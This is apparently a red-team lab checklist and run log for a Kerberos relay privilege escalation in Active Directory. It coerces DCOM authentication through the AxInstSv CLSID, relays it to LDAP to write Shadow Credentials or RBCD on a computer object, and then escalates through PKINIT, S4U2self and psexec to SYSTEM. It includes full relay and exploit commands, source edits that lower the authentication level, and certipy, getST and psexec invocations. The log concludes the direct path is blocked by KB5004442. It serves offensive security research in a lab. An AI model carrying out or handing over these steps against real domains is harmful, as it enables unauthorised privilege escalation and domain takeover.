# Direct-Kerberos post-bind write: test checklist

Goal: land the LDAP write (Shadow Creds / RBCD on the victim computer object)
without the race, using the author's `ldaps-direct-kerberos` branch, then S4U to
SYSTEM. Full prior detail is in `INVESTIGATION.md` and
`krbrelay-selflpe-runbook.md` in this dir.

## Why this should work (the one-liner)

The race is dead on our DCs. They read LDAP messages one at a time in TCP byte
order. The pcap in experiment 2 proved this. A pipelined modify then arrives
before the bind commits. That gives result=1. Or it arrives after signing
activates. That gives an RST. The author stopped racing. His branch picks a
different COM trigger, AxInstSv. That trigger gives a Kerberos context at level 2
(CONNECT), with no integrity. The branch does a normal blocking bind. After the
bind response, it sends the modify as a separate send. There is no pipelining and
no signing, so the write lands. We never tried this. Every prior test used the
integrity context and the pipelined race.

## Lab details (mayyhem)

- DC: `dc.mayyhem.com`, 10.112.0.70, Server 2022, build 20348.5622
- LDAP signing: NOT required. Channel binding / EPA: NOT required. (confirmed by chryzsh)
- Victim (shell host): PS1-LAB, Server 2022, 10.112.0.84. (PS1-DEV is the Win11 box, not the target.)
- Victim DN: `CN=PS1-LAB,CN=Computers,DC=mayyhem,DC=com`
- Relay: branch `relay_server.py` on Kali. The exe connects out to the Kali relay IP and port.
- ADCS present on the DC (HTTP + HTTPS web enrollment) -> PKINIT available -> Shadow Creds path viable
- Branch: `upstream/ldaps-direct-kerberos` (fork: `forks/KrbRelayBof`)
- Trigger CLSID: AxInstSv `{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}`

## What we already tried (all dead, see INVESTIGATION.md)

- [x] Pipelined race [Modify][Bind]: result=1 every time
- [x] Reversed [Bind][Modify] one segment: bind ok, then RST (signing instant)
- [x] Pcap on DC: both msgs one TCP segment, DC dispatches serially in byte order
- [x] ATQ thread starvation (50 conns): no effect
- [x] DC cores 2 -> 4 vCPU: no effect
- [x] DC UBR matched to author's (5622): no effect
- [x] LDAP signing policy = None: still result=1 (ordering, not signing)
- [x] Cross-lab (mayyhem / slab / scan): all result=1
- [x] RBCD ACE padding (8x): no effect
- [x] LDAPS (636) with SASL sign/seal: result=53
- [x] tc netem latency on relay->DC leg: no effect
- [x] NTLM downgrade (force WINNT): DCOM ok, LDAPS blocked by SIGN+MIC on patched DC
- [ ] ESC8 two-stage (LDAPPatch branch): not tested, deprioritized

Common thread: every run above used the old integrity context (McpManagementService
CLSID) and the pipelined race. None used the AxInstSv level-2 context with a
sequential post-bind write. That is the gap this plan fills.

## Decision 0: use the standalone exe (chosen)

Port the branch's auth changes into `krbrelay.c` here, then run the exe against
the branch `relay_server.py`. Both speak KRB1 v4, so they interoperate. The exe
keeps the Negotiate and integrity code today. Without these edits the relay sees
SPNEGO and falls back to the dead race.

Two concepts, four one-line edits in `krbrelay.c`:

- Auth service Negotiate -> Kerberos. The first token becomes a raw AP-REQ
  (0x6e), so the relay takes the no-race post-bind path.
  - [x] line 1175: `RPC_C_AUTHN_GSS_NEGOTIATE` -> `RPC_C_AUTHN_GSS_KERBEROS`
  - [x] line 1762: `RPC_C_AUTHN_GSS_NEGOTIATE` -> `RPC_C_AUTHN_GSS_KERBEROS`
  - [x] line 1828: `RPC_C_AUTHN_GSS_NEGOTIATE` -> `RPC_C_AUTHN_GSS_KERBEROS`
- Auth level DEFAULT -> CONNECT. No integrity is requested, so the DC never turns
  signing on.
  - [x] line 1776: `RPC_C_AUTHN_LEVEL_DEFAULT` -> `RPC_C_AUTHN_LEVEL_CONNECT`
- [x] Rebuild: `./build.sh` (done 2026-10-05, krbrelay.exe 69120 bytes)

## Setup

- [x] Relay ready: `relay_server.py` in this dir is the branch direct-kerberos relay. It is patched to bind 0.0.0.0 and to accept the exe remote peer (lab only).
- [x] Exe ready: `krbrelay.exe` rebuilt with the Kerberos and CONNECT-level changes.
- [x] Victim DN known (Lab details above).
- [ ] Copy `krbrelay.exe` to PS1-LAB.
- [ ] Clear any stale `msDS-KeyCredentialLink` on the victim (hygiene, DA in lab):
      `certipy shadow clear -u admin@mayyhem.com -p '<pw>' -account PS1-LAB$ -dc-ip 10.112.0.70`

## Gating step (the whole thing turns on this)

The exe does not print the auth level. The write result is the signal instead.

- [ ] result=0 on the post-bind write means AxInstSv gave a level-2 context and the write landed.
- [ ] A signing error or an RST means AxInstSv gave an integrity context on this host.
      Then add a level print to the exe, or try another CLSID.
- [ ] Optional level print: capture `auth_type` in `accept_hook` and print it. This mirrors the branch diagnostic.

## Core write (LDAP 389, no race)

- [ ] Start relay, Shadow Creds, padding 1 [chryzsh runs]:
      ```
      python3 relay_server.py shadowcred --port 9008 \
        --ldap-host dc.mayyhem.com --ldap-address 10.112.0.70 --ldap-port 389 \
        --domain mayyhem.com --machine PS1-LAB \
        --target-dn "CN=PS1-LAB,CN=Computers,DC=mayyhem,DC=com" --pfx-out victim.pfx --padding-count 1
      ```
- [ ] Fire the coercion on PS1-LAB [chryzsh runs], exe pointed at the Kali relay:
      `krbrelay.exe <relay_ip> 9008 ldap/dc.mayyhem.com 127.0.0.1 <rpc_port> {90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}`
- [ ] Expect: `LDAP final bind succeeded`, one ModifyResponse result=0,
      `[+] Added Shadow Credential`. result=0 on the first write at padding 1 = fix works.

## LDAPS (636), same approach

- [ ] Repeat the relay with `--ldap-port 636 --ldap-tls --padding-count 1`. Expect result=0.

## Finish to SYSTEM (runbook step 4)

- [ ] PKINIT: `certipy auth -pfx victim.pfx -username PS1-LAB$ -domain mayyhem.com -dc-ip 10.112.0.70`
- [ ] S4U2self -> `cifs/ps1-lab.mayyhem.com` as Administrator (`getST.py -self -impersonate Administrator`)
- [ ] `psexec.py -k -no-pass ps1-lab.mayyhem.com` -> SYSTEM

## RBCD variant (only if you control an SPN account)

Same as Shadow Creds but `rbcd --delegate-sid <SID of controlled SPN account>
--padding-count 1`. MAQ=0 blocks making a computer account, so this needs an
existing SPN-bearing account you already control.

## If AxInstSv does not give level 2 on the real target

- [ ] Enumerate other local COM classes that authenticate at level 2 (PrintNotify
      is a negative control, gives integrity).
- [ ] If ADCS web enrollment is reachable, fall back to ESC8 (LDAPPatch branch).

## Run log

- 2026-10-05 attempt 1: no result, wrong setup. The exe used the old CLSID
  {A9819296...} and port 9598. The relay was the fork race version on port 9008.
  The bridge never connected (stage 71, 0 legs). Good signs: PS1-LAB reached Kali
  inbound (tcpdump), and the exe printed COM security initialized for Kerberos.
  Fix: run the patched relay from this dir, match the port, use the AxInstSv CLSID.
- 2026-10-05 attempt 2: bridge connected and preflighted (relay saw peer
  10.112.0.84). The exe does use the passed CLSID (argv[6] -> CLSIDFromString ->
  activation). The "McpManagementService" print is a stale hardcoded label.
  COM activation failed with 0x80070422 (ERROR_SERVICE_DISABLED). AxInstSv is
  disabled on PS1-LAB, which is normal for a server. The relay then hangs at its
  second accept, so Ctrl-C it between runs. The method is still unproven. We need
  an enabled CONNECT-level trigger, or we enable AxInstSv in the lab to prove it.
- 2026-10-05 confirmed: `sc qc AxInstSV` shows START_TYPE 4 DISABLED, runs as
  LocalSystem. Plan: enable it in the lab (DA, `start= demand`) to prove the
  post-bind write, then hunt a server-default level-2 trigger for the real target.
  Open risk: once enabled, the standard user can still lack DCOM activation rights
  on AxInstSv. That shows as 0x80070005 instead.
- 2026-10-05 attempt 3 (AxInstSv enabled): activation worked, both legs relayed,
  SASL bind result=0, then the DC reset the connection on the post-bind write.
  That is the integrity-context signature: the bind negotiated a security layer,
  so the DC enforces signing even though the policy does not require it. Added
  diagnostics. The exe now prints the relayed auth_type, auth_level, and token[0].
  The relay prints leg-1 token[0] and direct_kerberos. Rerun to read the level.
- 2026-10-05 attempt 3 result and verdict. The exe printed auth_type=16
  auth_level=5 token[0]=0x6e. The relay printed direct_kerberos=True. So the
  post-bind path ran on a raw Kerberos AP-REQ. The context is PKT_INTEGRITY
  (level 5), not CONNECT (level 2). An integrity context makes the SASL bind
  negotiate a security layer. The DC then resets the unsigned post-bind write.
  Verdict: direct LDAP is blocked on a patched Server 2022. KB5004442 floors the
  DCOM coercion callback at PKT_INTEGRITY. The relay cannot sign, because it has
  no session key. The trigger CLSID does not change the level, because the level
  is a runtime floor, not a per-class property. AxInstSv level 2 is a Windows 11
  behavior. This is the same KB5004442 wall the NTLM path hit. The live path left
  is ESC8 to AD CS web enrollment (LDAPPatch branch). mayyhem has web enrollment.
- 2026-10-05 signing confirmed on the DC: ldapsecuritycheck from PS1-LAB
  (student01) reports LDAP does NOT require signing and LDAPS does NOT require
  channel binding on dc.mayyhem.com. So the environment is maximally favorable and
  the write still fails. That pins the blocker entirely on the client-side
  PKT_INTEGRITY context (KB5004442), not the DC. Verdict stands.
- 2026-10-05 registry on the DC agrees: LDAPServerIntegrity=0x1 (signing not
  required), LdapEnforceChannelBinding absent (channel binding not enforced).
